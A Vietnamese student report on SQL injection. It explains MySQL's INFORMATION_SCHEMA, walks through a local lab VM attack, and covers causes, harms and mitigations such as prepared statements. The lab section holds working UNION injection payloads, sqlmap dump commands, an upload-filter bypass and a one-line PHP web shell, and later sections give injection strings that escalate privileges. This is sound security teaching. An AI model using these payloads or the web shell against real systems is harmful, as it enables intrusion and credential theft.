 # <div align="center"><p> Sql_injection </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 1/4/2022
 ### MỤC LỤC
 1. [Tìm hiểu về database: information_schema](#gioithieu)
 
       1.1 [Khái niệm INFORMATION_SCHEMA](#kni)
      
       1.2 [Các table trong INFORMATION_SCHEMA](#tab)
      
       1.3 [Các câu lệnh trong INFORMATION_SCHEMA](#cc)
      
 2. [Thực hành lab](#tha) 

       2.1 [Phương pháp thủ công](#thucong)
      
       2.2 [Phương pháp sử dụng sqlmap](#sql)
       
 3. [Tìm hiểu sqli là gì, Xảy ra khi nào, Tác hại, Khắc phục](#ths)
 
       3.1 [Khái niệm sqli](#kns)
      
       3.2 [Tại sao lỗ hổng sql injection tồn tại](#xa)
      
       3.3 [Tác hại](#th)
       
       3.4 [Khắc phục](#kp)
          
 4. [Cách nhúng sql vào php](#ca)
 
### Nội dung báo cáo 
#### 1. Tìm hiểu về database: information_schema <a name="gioithieu"></a>

 <br> 1.1 Khái niệm INFORMATION_SCHEMA<a name="kni"></a></br>
 
  - INFORMATION_SCHEMA là 1 database nằm bên trong 1 máy chủ MySQL, lưu thông tin về tất cả các database khác mà máy chủ MySQL đang lưu giữ. INFORMATION_SCHEMA chứa các table read-only. Chúng thực chất là các view, chứ không phải các table thực sự, do đó không có file nào liên kết với chúng, và chúng ta không thể đặt trigger lên các table này. Ngoài ra thì không có thư mục của database này trong máy chủ MySQL. Vì các table trong database này là read-only, nên chúng ta chỉ có thể sử dụng lệnh SELECT trên chúng, các lệnh INSERT, UPDATE và DELETE sẽ không chạy được trên database này.
      
 <br> 1.2 Các table trong INFORMATION_SCHEMA<a name="tab"></a></br>
 
 <table align="center">
   <tr>
        <td align="center" ><b>Tên table</b></td>
        <td align="center"><b>Nội dung</b></td>
        
   </tr>
   <tr>
        <td ><b>CHECK_CONSTRAINTS</b></td>
        <td ><b>Chi tiết liên quan đến từng ràng buộc CHECK</b></td>      
   </tr>
   <tr>
        <td ><b>COLUMN_DOMAIN_USAGE</b></td>
        <td ><b>Chi tiết liên quan đến các cột có kiểu dữ liệu bí danh</b></td>      
   </tr>
   <tr>
        <td><b>COLUMN_PRIVILEGES</b></td>
        <td><b>Đặc quyền cột do người dùng hiện tại cấp hoặc cấp</b></td>      
   </tr>
   <tr>
        <td><b>COLUMNS</b></td>
        <td><b>cột từ cơ sở dữ liệu hiện tại</b></td>      
   </tr>
   <tr>
        <td><b>CONSTRAINT_COLUMN_USAGE</b></td>
        <td><b>Chi tiết về các ràng buộc liên quan đến cột</b></td>      
   </tr>
  <tr>
        <td><b>CONSTRAINT_TABLE_USAGE</b></td>
        <td><b>Chi tiết về các ràng buộc liên quan đến bảng</b></td>      
   </tr>
 <tr>
        <td><b>DOMAIN_CONSTRAINTS</b></td>
        <td><b>Chi tiết liên quan đến các loại dữ liệu bí danh và các quy tắc liên quan đến chúng (người dùng này có thể truy cập được)</b></td>      
   </tr>
 <tr>
        <td><b>DOMAINS</b></td>
        <td><b>Chi tiết kiểu dữ liệu bí danh (người dùng này có thể truy cập)</b></td>      
   </tr>
 <tr>
        <td><b>KEY_COLUMN_USAGE</b></td>
        <td><b>Chi tiết được trả về nếu cột có liên quan đến khóa hay không</b></td>      
   </tr>
 <tr>
        <td><b>PARAMETERS</b></td>
        <td><b>Chi tiết liên quan đến từng tham số liên quan đến các chức năng và thủ tục do người dùng xác định mà người dùng này có thể truy cập</b></td>      
   </tr>
 <tr>
        <td><b>REFERENTIAL_CONSTRAINTS</b></td>
        <td><b>Chi tiết về khóa ngoại</b></td>      
   </tr>
 <tr>
        <td><b>ROUTINES</b></td>
        <td><b>Các chi tiết liên quan đến các quy trình (hàm & thủ tục) được lưu trữ trong cơ sở dữ liệu</b></td>      
   </tr>
 <tr>
        <td><b>ROUTINE_COLUMNS</b></td>
        <td><b>Một hàng cho mỗi cột được trả về bởi hàm giá trị bảng</b></td>      
   </tr>
 <tr>
        <td><b>SCHEMATA</b></td>
        <td><b>Chi tiết liên quan đến các lược đồ trong cơ sở dữ liệu hiện tại</b></td>      
   </tr>
 <tr>
        <td><b>TABLE_CONSTRAINTS</b></td>
        <td><b>Chi tiết liên quan đến các ràng buộc bảng trong cơ sở dữ liệu hiện tại</b></td>      
   </tr>
  <tr>
        <td><b>TABLE_PRIVILEGES</b></td>
        <td><b>Các đặc quyền được cấp bởi người dùng hiện tại</b></td>      
   </tr>
  <tr>
        <td><b>TABLES</b></td>
        <td><b>Các chi tiết liên quan đến bảng được lưu trữ trong cơ sở dữ liệu</b></td>      
   </tr>
  <tr>
        <td><b>VIEW_COLUMN_USAGE</b></td>
        <td><b>Chi tiết về các cột được sử dụng trong định nghĩa chế độ xem</b></td>      
   </tr>
  <tr>
        <td><b>VIEW_TABLE_USAGE</b></td>
        <td><b>Chi tiết về các bảng được sử dụng trong định nghĩa chế độ xem</b></td>      
   </tr>
  <tr>
        <td><b>VIEW</b></td>
        <td><b>Chi tiết liên quan đến các ràng buộc bảng trong cơ sở dữ liệu hiện tại</b></td>      
   </tr>
  <tr>
        <td><b>TABLE_CONSTRAINTS</b></td>
        <td><b>Chi tiết liên quan đến các chế độ xem được lưu trữ trong cơ sở dữ liệu</b></td>      
   </tr>
 </table>
 <br> 1.3 Các câu lệnh trong INFORMATION_SCHEMA<a name="cc"></a></br>
 
  - Để Hiển thị TABLESvà COLUMNS trong cơ sở dữ liệu hoặc tìm TABLES và COLUMNS.Truy vấn đầu tiên này sẽ trả về tất cả các bảng trong cơ sở dữ liệu mà chúng ta đang truy vấn.

    `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES`
 
  - Truy vấn thứ hai sẽ trả về danh sách tất cả các cột và bảng trong cơ sở dữ liệu mà chúng ta đang truy vấn.
  
    `SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS` 
    
  - Hoặc, chúng ta cũng có thể chỉ truy vấn COLUMNS từ một bảng cụ thể và trả về tên cột từ bảng cụ thể 'Album' trong cơ sở dữ liệu.
  
    `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Album'`
    
  - Tiếp theo, chúng ta có thể tìm xem có hay không TABLE nguồn dữ liệu khớp với một số loại tham số tìm kiếm.
  
    `IF EXISTS( SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME = 'Title')
     SELECT 'found' AS search_result ELSE SELECT 'not found' AS search_result;`
    
  - Sử dụng INFORMATION_SCHEMA chế độ xem trong nguồn dữ liệu của chúng ta có thể là một cách đáng tin cậy để xác định những gì có trong nguồn dữ liệu trong khi chúng ta xây dựng các truy vấn của mình.
  
#### 2. Thực hành lab <a name="tha"></a>
 <br> 2.1 Phương pháp thủ công <a name="thucong"></a></br>
  - B1: Kiểm tra IP của máy đang sử dụng bằng lệnh `ipconfig` (Linux)
  
      ![ipconfig](https://user-images.githubusercontent.com/101852647/161125758-c703e892-7aa9-45bc-92f3-d9af41a2ed69.png)
     
  - B2: Sử dụng `netdiscover` để quét Giao thức ARP và nhận các thiết bị trên Mạng LAN Chúng ta có thể thấy rằng IP thứ ba là IP mong muốn và IP thứ hai là IP Kali của chúng ta
  
      ![image](https://user-images.githubusercontent.com/101852647/161126427-18d4dc5c-0098-4f76-bf12-03303e15f04a.png)
      
      ![image](https://user-images.githubusercontent.com/101852647/161126470-1d03c162-2d4e-4752-a58d-4cd00de43dd6.png)
  - B3: Lệnh `nmap -T4 -p- 192.168.199.129` có nghĩa là quét nhanh hơn trên tất cả các cổng ( 65535 PORTS ). Nmap cho biết chúng ta có hai cổng TCP mở ( 22 / SSH  + 80 / HTTP )
  
      ![image](https://user-images.githubusercontent.com/101852647/161127145-1cea6ab4-c338-4b1a-99d5-bb187f37b544.png)

  - B4: Tiếp theo sẽ sử dụng `nmap -Sv -T4 -p- 192.168.199.129` để liệt kê phiên bản của dịch vụ trên 2 cổng 22,80
  
      ![image](https://user-images.githubusercontent.com/101852647/161128195-b306e693-c808-4023-979d-40bb3b56480b.png)

  - B5: Đây là trang chính của của trang web cần tấn công
  
      ![image](https://user-images.githubusercontent.com/101852647/161128439-3a762db0-85c0-43de-8957-d23a414e36ff.png)

  - B6: Bây giờ chúng ta sẽ điều hướng đến trang admin nhưng thông tin người dùng vẫn chưa xác định
  
      ![image](https://user-images.githubusercontent.com/101852647/161129055-e1abe911-399e-45d1-b372-4cb65e6759d5.png)

  - B7: Kiểm tra sqli bằng cách thêm truy vấn `?id=1'` vào url. Khi đó trang chủ trả về `Syntax error` chứng tỏ từ câu lệnh `GET` vừa thêm vào đường dẫn ta có thể tạo câu lệnh truy xuất vào data MySQL nên có thể thấy được trang web có sqli.
  
      ![image](https://user-images.githubusercontent.com/101852647/161129497-a58177af-327a-4182-94fc-bddb57926b86.png)
 
  - B8: Khai thác sqli để liệt kê thông tin đăng nhập của quản trị viên. Chúng ta sẽ liệt kê xem là trong database có bao nhiêu cột bằng cách thử câu lệnh `order by` từ 1 đến 4, khi đến cột 5 thì xuất hiện thông báo lỗi nên nhận thấy được trong database sẽ có 4 cột.
  
      ![image](https://user-images.githubusercontent.com/101852647/161130618-92043f18-71d1-4bc5-afcf-8f52ddf3185d.png)
      ![image](https://user-images.githubusercontent.com/101852647/161130655-f75a2084-4786-49b5-ad13-01ee7319a8c0.png)

  - B9: Bây giờ chúng ta sẽ liệt kê thêm và sẽ cố gắng tìm thêm thông tin nhưng trước tiên chúng ta sẽ tìm xem phiên bản của nó là gì bằng câu lệnh `union all select 1,@@version,3,4
  
      ![image](https://user-images.githubusercontent.com/101852647/161130933-31b9f0b8-0d70-421a-a5db-16f5ab769511.png)
 
  - B10: Tiếp theo chúng ta sẽ tìm kiếm người dùng và sẽ liệt kê những người dùng bằng câu lệnh `union all select 1,user(),3,4
  
      ![image](https://user-images.githubusercontent.com/101852647/161131480-d805a116-30d6-4821-af3c-28cb739353fb.png)

  - B11: Ở bước trên chúng ta đã tìm thấy người dùng nhưng chưa tìm thấy mật khẩu nên bây giờ chúng ta sẽ sử dụng câu lệnh `union all select 1,concat(login,0x3a,password),3,4 FROM users` để tìm thấy được mật khẩu 
      ![image](https://user-images.githubusercontent.com/101852647/161132020-9dab2f8e-7de9-48c6-abdc-ffb88c2270bc.png)

  - B12: Ở trên chúng ta đã tìm thấy được mật khẩu nhưng nó đang được mã hóa ở dạng là hàm băm nên bây giờ chúng ta sẽ sử dụng công cụ `hash ID` để xem nó là dạng mã hóa gì
  
      ![image](https://user-images.githubusercontent.com/101852647/161132434-f30536d4-a13f-4592-a6a1-de1e0bdcd2d1.png)

  - B13: Sau khi biết mật khẩu ở dạng là MD5 thì chúng ta giải mã mật khẩu và nhận được kết quả là: `P4ssw0rd`
  
 <br> 2.2 Phương pháp sử dụng sqlmap <a name="sql"></a></br>
 
  - B1: Bây giờ chúng ta sẽ quét bằng ` sqlmap -u http://192.168.199.129:80/cat.php?id=1 --dbs` để có thể quét được database của nạn nhân
  
      ![image](https://user-images.githubusercontent.com/101852647/161133072-01f63d6c-57f1-4c3d-a211-b4e22e3f234c.png)
      
      ![image](https://user-images.githubusercontent.com/101852647/161133112-3d4c21ff-ba7f-4ca6-bdbc-4fd992c7f07a.png)
      
  - B2: Tiếp theo chúng ta sẽ chạy lệnh `sqlmap -u http://192.168.199.129:80/cat.php?id=1 --tables -D photoblog` để tìm kiếm các bảng có trong database
  
      ![image](https://user-images.githubusercontent.com/101852647/161133725-28f8b7dc-e619-473d-8c9b-162b2af314be.png)

  - B3: Tiếp theo chúng ta sẽ lấy thông tin người dùng bằng lệnh `sqlmap -u http://192.168.199.129:80/cat.php?id=1 --dump -D photoblog`
  
      ![image](https://user-images.githubusercontent.com/101852647/161133194-657d5b8e-6cb3-4ab2-a8c3-b683fab48903.png)

  - B4: Hiển thị kết quả dưới dạng văn bảng
  
      ![image](https://user-images.githubusercontent.com/101852647/161134538-08db3fcb-fec1-4920-9008-45761e5e65c7.png)

  - B5: Sau khi có được mật khẩu thì chúng ta sẽ giải mã mật khẩu ở dạng MD5 và được kết quả là: `P4ssw0rd`
  - B6: Sau khi đăng nhập thành công thì chúng ta sẽ điều hướng đến trang `admin`. Ở đây chúng ta có thể tải hình với tên là `test`.
        
      ![image](https://user-images.githubusercontent.com/101852647/161135179-dce96ca7-4433-4f5a-9535-d31744a21b49.png)

  - B7: Hiện thị hình ảnh có trong database để kiểm tra xem là chúng ta có thể truy xuất vào database từ đường dẫn `192.168.199.129/admin/uploads/hacker.png` không
  
      ![image](https://user-images.githubusercontent.com/101852647/161135898-fad4460c-e893-4d94-a3b3-62e3aef18494.png)

  - B8: Bây giờ chúng ta sẽ trở về trang `uploads` để kiểm tra xem hình đó nó có trong uploads hay không
  
      ![image](https://user-images.githubusercontent.com/101852647/161136223-b86e4f4e-df97-4ede-9474-c4982b7451d9.png)
  
  - B9: Tạo một file php để có thể EXECUTE và lấy được cmd của đường dẫn .
  
      `<?php system($_GET["cmd"]); ?>`
      
  - B10: Bây giờ chúng ta sẽ tải thử file `shell.php`. Tuy nhiên đuôi file php không cho tải lên.
  
      ![image](https://user-images.githubusercontent.com/101852647/161137480-4866429e-eeed-4796-b189-9ddf2148f17b.png)
  
      ![image](https://user-images.githubusercontent.com/101852647/161137452-12852ad2-7de8-4a16-b1f1-3491fb2b46df.png)
      
  - B11: Vì vậy, chúng ta sẽ chỉnh sửa đuôi `php` thành `PHP`.
  
      ![image](https://user-images.githubusercontent.com/101852647/161137731-fe2a9ddc-8649-472c-9ae7-77d21c84308e.png)

  - B12: Sau khi chỉnh sửa chúng ta đã tải thành công file `shell.php`
  
      ![image](https://user-images.githubusercontent.com/101852647/161137847-7927c9f6-ee2a-420c-8f47-70e786a4764a.png)

  - B13: Bây giờ chúng ta sẽ kiểm tra xem nó đã có trong uploads chưa
  
      ![image](https://user-images.githubusercontent.com/101852647/161138056-8a9f8381-ddfa-42e0-9425-dc027aa4e6f1.png)

  - B14: Kiểm tra lại bằng cách gọi đường dẫn `192.168.199.129/admin/uploads/shell.PHP?cmd=whoami;id;uname -a` hiện lên thông báo như hình dưới đây. Chứng tỏ ta có thể sử dụng shell đã upload dưới dạng file php
  
      ![image](https://user-images.githubusercontent.com/101852647/161139179-69704e04-efce-47ee-9528-e890c3f9dbc1.png)

#### 3. Tìm hiểu sqli là gì, Xảy ra khi nào, Tác hại, Khắc phục, Dẫn chứng. <a name="ths"></a>
 <br> 3.1 Khái niệm sqli <a name="kns"></a></br>
  - SQL injection là kĩ thuật cho phép các kẻ tấn công chèn và thực thi các lệnh SQL bất hợp pháp (mà người phát triển không lường trước được) bên trong hệ thống, bằng cách lợi dụng các lỗ hổng bảo mật từ dữ liệu nhập vào của các ứng dụng. Qua đó làm lộ thông tin trong cơ sở dữ liệu, tạo ra sự sai lệch hoặc gây ra hư hỏng dữ liệu của hệ thống.
Một cách nôm na, ta khả năng hiểu tấn công SQL injection là việc truyền vào các mã SQL thông qua các ô nhập liệu, để làm thay đổi ngay mục đích câu truy vấn ban đầu. Với định nghĩa trên, ta khả năng tạm chia SQL injection thành một vài loại chính sau đây dựa vào cách tấn công dữ liệu truyền vào:
    - Tấn công: không mã hóa kí tự nhập
    - Tấn công: không kiểm tra kiểu dữ liệu nhập

 <br> 3.2 Tại sao lỗ hổng sql injection tồn tại <a name="xa"></a></br>
   - Một số nguyên nhân dẫn đến tồn tại lỗ hổng sql injection:
     - Không kiểm tra dữ liệu đầu vào:
       - Đây là dạng lỗi SQL Injection xảy ra khi thiếu đoạn mã kiểm tra dữ liệu đầu vào trong câu truy vấn SQL. Kết quả là người dùng cuối có thể thực hiện một số truy vấn không mong muốn đối với cơ sở dữ liệu của ứng dụng. `statement = "SELECT * FROM users WHERE user_name = '" + userName + "';"` Câu lệnh này sẽ trả về tên người dùng có trong bảng `user`. Tuy nhiên, nếu biến userName được nhập theo một cách có chủ ý, nó có thể trở thành một câu truy vấn SQL với mục đích khác hẳn so với mục đích của đoạn mã trên.
       - Ví dụ:
       
                 `SELECT * FROM users WHERE name = '' or '1'='1';`
                 
     - Xử lý không đúng kiểu:
       - Lỗi SQL injection dạng này thường xảy ra do lập trình viên định nghĩa đầu vào dữ liệu không rõ ràng hoặc thiếu bước kiểm tra và lọc kiểu dữ liệu đầu vào. Điều này có thể xảy ra khi một trường số được sử dụng trong truy vấn SQL nhưng lập trình viên lại thiếu bước kiểm tra dữ liệu đầu vào để xác minh kiểu của dữ liệu mà người dùng nhập vào có phải là số hay không.`statement = "SELECT * FROM data WHERE id = " + id_ + ";"` Ta có thể nhận thấy một cách rõ ràng mục đích của đoạn mã trên là nhập vào một số tương ứng với trường id. Tuy nhiên, người dùng cuối, thay vì nhập vào một số, họ lại nhập vào một chuỗi ký tự, và do vậy có thể trở thành một câu truy vấn SQL hoàn chỉnh mới mà bỏ qua ký tự thoát. Khi đó, nó sẽ thực hiện thao tác xóa toàn bộ bảng users ra khỏi cơ sở dữ liệu.
       - Ví dụ: 
           
                 `SELECT * FROM DATA WHERE id=1;DROP TABLE users`
  
     - Lỗi bảo mật bên trong máy chủ cơ sở dữ liệu:
       - Đôi khi lỗ hổng có thể tồn tại chính trong phần mềm máy chủ cơ sở dữ liệu, như là trường hợp hàm `mysql_real_escape_string()`của các máy chủ MySQL. Điều này sẽ cho phép kẻ tấn công có thể thực hiện một cuộc tấn công SQL injection thành công dựa trên những ký tự Unicode không thông thường ngay cả khi dữ liệu đầu vào đã được kiểm soát.
       
 <br> 3.3 Tác hại <a name="th"></a></br>
  - Thông tin đăng nhập bị đánh cắp: Sử dụng SQL Injection để tìm kiếm thông tin đăng nhập người dùng. Sau đó, những kẻ tấn công có thể mạo danh người dùng, sử dụng và thay đổi các quyền hạn của người dùng sẵn có.
  - Truy cập cơ sở dữ liệu: Sử dụng SQL Injection để truy cập vào nguồn thông tin được lưu trữ trong máy chủ cơ sở dữ liệu. Điều này có thể gây ra những vấn đề nghiêm trọng cho các dữ liệu của toàn bộ hệ thống vận hành.
  - Xóa dữ liệu: Sử dụng SQL Injection để xóa các bản ghi của cơ sở dữ liệu, bao gồm cả drop tables, gây ra những sự thay đổi hoặc phá vỡ các cấu trúc của cơ sở dữ liệu.
  - Thay đổi dữ liệu: Sử dụng SQL Injection để chủ động thay đổi hoặc thêm dữ liệu mới vào cơ sở dữ liệu hiện tại, ảnh hưởng đến kết quả chiết xuất dữ liệu cuối cùng xảy ra những sai lệch.
  
 <br> 3.4 Khắc phục <a name="kp"></a></br>
 
  - Dọn dẹp: Bạn có thể sử dụng trình xác thực hoặc phần mềm làm sạch đầu vào, ứng dụng web chỉ chấp nhận một số đầu vào nhất định và từ chối những đầu vào không chấp nhận. Đây là phương pháp phổ biến, được người dùng sử dụng thường xuyên.

  - Lọc và xác thực: Để lọc SQL Injection và ngăn chặn các mối đe dọa tiềm ẩn, bạn có thể cài đặt tường lửa (WAF). WAF sẽ lọc các đầu vào trong danh sách và sử dụng các phương pháp xác thực riêng biệt để ngăn các truy vấn SQL Injection. Danh sách sẽ được kiểm tra và cập nhật thường xuyên để thích ứng với mọi hoàn cảnh của doanh nghiệp.

  - Giới hạn phạm vi của SQL Injection: Việc ngăn chặn hoàn toàn SQL Injection là rất khó thực hiện, tính khả thi không cao. Các chuyên gia trong lĩnh vực bảo mật sẽ phải thường xuyên kiểm tra để tối ưu hóa hiệu suất của phần mềm. WAF có thể xác minh chéo đầu vào với dữ liệu Giao thức Internet (IP) trước khi chặn yêu cầu.

  - Tránh các URL không an toàn: Nếu một trang web không sử dụng Giao thức truyền siêu văn bản an toàn (HTTPS) hoặc sử dụng Lớp cổng bảo mật an toàn (SSL) và Bảo mật lớp truyền tải (TLS) để mã hóa. Những kẻ tấn công có thể sử dụng các URL chứa các cookie SQL Injection để giành quyền truy cập vào cơ sở dữ liệu của bạn. 

  -  Điểm để tấn công chính là tham số truyền vào câu truy vấn. Do vậy, cần phải đảm bảo thực hiện việc kiểm tra dữ liệu truyền vào từ người dùng, để tránh người dùng nhập vào những nội dung khả năng gây ra ra sai lệch khi thực hiện truy vấn. Để kiểm tra dữ liệu từ người dùng, ta cần lọc bớt những nội dung nguy hiểm. Giải pháp cho việc lọc dữ liệu này là dùng chuỗi được escape (mã hóa). 

  - Khi thực hiện escape một chuỗi, tức là mã hoá các kí tự đặc biệt của chuỗi (ví dụ như kí tự ‘, &, |, …) để nó không còn được hiểu là 1 kí tự đặc biệt nữa. Mỗi ngôn ngữ lập trình đều cung cấp các hàm để thực hiện escape chuỗi, trong `PHP` ta sẽ dùng hàm `mysqli_real_escape_string()` hoặc cũng khả năng dùng `addslashes()` để thực hiện điều này.
  - Nhận dữ liệu kiểu INT: Khi chúng ta nhận dữ liệu ID trên URL thì cách tốt nhất bạn nên ép kiểu, chuyển nó về kiểu số INT, sau đó chuyển về kiểu STRING (nếu cần thiết). Sau khi chúng ta thực hiện ép kiểu và chuyển nó về int và string thì cho dù ta nhập bất kì ký tự nào cũng sẽ bị clear ra khỏi.
    - Ví dụ: 
        
            `$id = isset($_GET['id']) ? (string)(int)$_GET['id'] : false;`
            
  - Hoặc là chúng ta có thể dùng hàm `str_replace` để xóa đi những ký tự không phải là chữ số
    - Ví dụ: 
   
            `$id = isset($_GET['id']) ? $_GET['id'] : false;
             $id = str_replace('/[^0-9]/', '', $id);`
  - Một cách khác là chúng ta tận dụng các bộ lọc tích hợp sẵn của PHP. Chúng ta sẽ sử dụng hàm `filter_input` để xác thực các biến từ các nguồn không an toàn. Nó sẽ nhận một biến bên ngoài và tùy chọn lọc nó. ví dụ bên dưới sử dụng bộ lọc `FILTER_VALIDATE_INT` bộ lọc này sẽ xác thực giá trị dưới dạng số nguyên, tùy chọn từ phạm vi được chỉ định và chuyển đổi thành int khi thành công.
    - Ví dụ:
    
            `$id = filter_input( INPUT_GET, 'id', FILTER_VALIDATE_INT);`
             
  - Sử dụng hàm `sprintf`: Trả về một chuỗi được định dạng. Trong hàm này nó sẽ có 2 tham số: 1 là chuỗi và nó chứa một đoạn Regex để thay thế. 2 là giá trị được thay thế tương ứng.
    - Ví dụ: 
   
            `$webname = 'hello';
             $title = 'Xin chào các bạn'; 
             echo sprintf('Website %s laf website %s', $webname, $title);`
 - Sử dụng các câu lệnh chuẩn bị sẵn (câu lệnh được tham số hóa). Các câu lệnh chuẩn bị sẵn cũng cung cấp khả năng bảo vệ mạnh mẽ chống lại SQL injection , vì các giá trị tham số không được nhúng trực tiếp vào bên trong chuỗi truy vấn SQL. Các giá trị tham số được gửi đến máy chủ cơ sở dữ liệu riêng biệt với truy vấn bằng cách sử dụng một giao thức khác và do đó không thể can thiệp vào nó. Máy chủ sử dụng các giá trị này trực tiếp tại điểm thực thi, sau khi mẫu câu lệnh được phân tích cú pháp.
   - Tạo Truy vấn SELECT mySQL: để chọn dữ liệu từ một bảng bằng cách sử dụng câu lệnh chuẩn bị sẵn của mySQLi
   - Ví dụ:
   
           `$name = $_GET['username'];

            if ($stmt = $mysqli->prepare("SELECT password FROM tbl_users WHERE name=?")) {

            // Liên kết một biến với tham số dưới dạng chuỗi. 
            $stmt->bind_param("s", $name);

            // Thực hiện câu lệnh. 
            $stmt->execute();

            //  Lấy các biến từ truy vấn. 
            $stmt->bind_result($pass);

            // Tìm nạp dữ liệu. 
            $stmt->fetch();

            // Hiển thị dữ liệu. 
            printf("Password for user %s is %s\n", $name, $pass);

            // Đóng câu lệnh đã chuẩn bị. 
            $stmt->close();

            }`
    - Tạo Truy vấn INSERT mySQL: để chèn dữ liệu từ một bảng bằng cách sử dụng câu lệnh chuẩn bị sẵn của mySQLi
    - Ví dụ:

           ` $name = $_GET['username'];
             $password = $_GET['password'];

             if ($stmt = $mysqli->prepare("INSERT INTO tbl_users (name, password) VALUES (?, ?)")) {

             // Liên kết một biến với tham số dưới dạng chuỗi. 
             $stmt->bind_param("ss", $name, $password);

             // Thực hiện câu lệnh. 
             $stmt->execute();

             // Đóng câu lệnh đã chuẩn bị. 
             $stmt->close();

             }`
   - Tạo Truy vấn UPDATE mySQL: để cập nhật dữ liệu từ một bảng bằng cách sử dụng câu lệnh chuẩn bị sẵn của mySQLi
   - Ví dụ:
   
            `$name = $_GET['username'];
             $password = $_GET['password'];

             if ($stmt = $mysqli->prepare("UPDATE tbl_users SET password = ? WHERE name = ?")) {

             //  Liên kết một biến với tham số dưới dạng chuỗi. 
             $stmt->bind_param("ss", $password, $name);

             // Thực hiện câu lệnh. 
             $stmt->execute();

            // Đóng câu lệnh đã chuẩn bị. 
            $stmt->close();

            }`
   - Tạo Truy vấn DELETE mySQL: để xóa dữ liệu từ một bảng bằng cách sử dụng câu lệnh chuẩn bị sẵn của mySQLi
   - Ví dụ:
   
           `$name = $_GET['username'];
            $password = $_GET['password'];

            if ($stmt = $mysqli->prepare("DELETE FROM tbl_users WHERE name = ?")) {

            // Bind the variable to the parameter as a string. 
            $stmt->bind_param("s", $name);

            // Execute the statement.
            $stmt->execute();

            // Close the prepared statement.
            $stmt->close();

           }`
 - Các tổ chức có thể tập trung vào những bước sau đây để bảo vệ mình khỏi những cuộc tấn công SQL Injection:

   - Không bao giờ được tin tưởng những input người dùng nhập vào: Dữ liệu luôn phải được xác thực trước khi sử dụng trong các câu lệnh SQL.
   - Các thủ tục được lưu trữ: Những thủ tục này có thể trừu tượng hóa các lệnh SQL và xem xét toàn bộ input như các tham số. Nhờ đó, nó không thể gây ảnh hưởng đến cú pháp lệnh SQL.
   - Các lệnh được chuẩn bị sẵn: Điều này bao gồm việc tạo truy vấn SQL như hành động đầu tiên và sau đó xử lý toàn bộ dữ liệu được gửi như những tham số.
   - Những cụm từ thông dụng: Những cụm từ này được sử dụng để phát hiện mã độc và loại bỏ nó trước khi câu lệnh SQL được thực hiện.
   - Thông báo lỗi đúng: Thông báo lỗi phải tuyệt đối tránh tiết lộ những thông tin/chi tiết nhạy cảm và vị trí xảy ra lỗi trên thông báo lỗi.
   - Giới hạn quyền truy cập của người dùng đối với cơ sở dữ liệu: Chỉ những tài khoản có quyền truy cập theo yêu cầu mới được kết nối với cơ sở dữ liệu. Điều này có thể giúp giảm thiểu những lệnh SQL được thực thi tự động trên server.
   - Hãy loại bỏ các kí tự meta như ‘”/\; và các kí tự extend như NULL, CR, LF, … trong các string nhận được từ:
   
     >input do người dùng đệ trình
     
     >các tham số từ URL
     
     >các giá trị từ cookie
     
   - Đối với các giá trị numeric, hãy chuyển nó sang integer trước khi query SQL, hoặc dùng ISNUMERIC để chắc chắn nó là một số integer.
   - Thay đổi “Startup and run SQL Server” dùng mức low privilege user trong tab SQL Server Security.
   - Xóa các stored procedure trong database master mà không dùng như:
   
     >xp_cmdshell
     
     >xp_startmail
     
     >xp_sendmail
     
     >sp_makewebtask
     

#### 4. Cách nhúng sql vào php <a name="ca"></a>

 - Một cách khả thi để lấy mật khẩu là phá vỡ các trang kết quả tìm kiếm của bạn. Điều duy nhất mà kẻ tấn công cần làm là xem liệu có bất kỳ biến đã gửi nào được sử dụng trong các câu lệnh SQL không được xử lý đúng cách hay không. Các bộ lọc này có thể được đặt thường ở dạng trước để tùy chỉnh WHERE, ORDER BY, LIMIT và OFFSET các mệnh đề trong SELECT câu lệnh. Nếu cơ sở dữ liệu của bạn hỗ trợ UNION cấu trúc, kẻ tấn công có thể cố gắng nối toàn bộ truy vấn vào truy vấn ban đầu để liệt kê mật khẩu từ một bảng tùy ý. Việc sử dụng các trường mật khẩu được mã hóa rất được khuyến khích.
     >Ví dụ: Liệt kê các bài viết ... và một số mật khẩu 
 
         `<?php
     
         $query  = "SELECT id, name, inserted, size FROM products
         
           WHERE size = '$size'";
           
         $result = odbc_exec($conn, $query);
         
         ?>`
 - SQL UPDATE cũng dễ bị tấn công. Những truy vấn này cũng bị đe dọa bằng cách cắt và thêm một truy vấn hoàn toàn mới vào nó. Nhưng kẻ tấn công có thể lúng túng với SET điều khoản. Trong trường hợp này, một số thông tin lược đồ phải được sở hữu để thao tác truy vấn thành công. Điều này có thể đạt được bằng cách kiểm tra các tên biến biểu mẫu, hoặc chỉ đơn giản là ép buộc thô bạo. Không có quá nhiều quy ước đặt tên cho các trường lưu trữ mật khẩu hoặc tên người dùng.
    >Ví dụ: Từ đặt lại mật khẩu ... đến nhận được nhiều đặc quyền hơn 
    
       `<?php
    
        $query = "UPDATE usertable SET pwd='$pwd' WHERE uid='$uid';";
        
        ?>`
 - Nhưng nếu một người dùng độc hại gửi giá trị ' or uid like'%admin% cho $uid để thay đổi mật khẩu của quản trị viên hoặc chỉ cần đặt $ pwd để hehehe', trusted=100, admin='yes có được nhiều đặc quyền hơn
    >Ví dụ:  
      
       `<?php
    
       // $uid: ' or uid like '%admin%
       
          $query = "UPDATE usertable SET pwd='...' WHERE uid='' or uid like '%admin%';";
          
       // $pwd: hehehe', trusted=100, admin='yes
      
         $query = "UPDATE usertable SET pwd='hehehe', trusted=100, admin='yes' WHERE...;";     
         
         ?>`
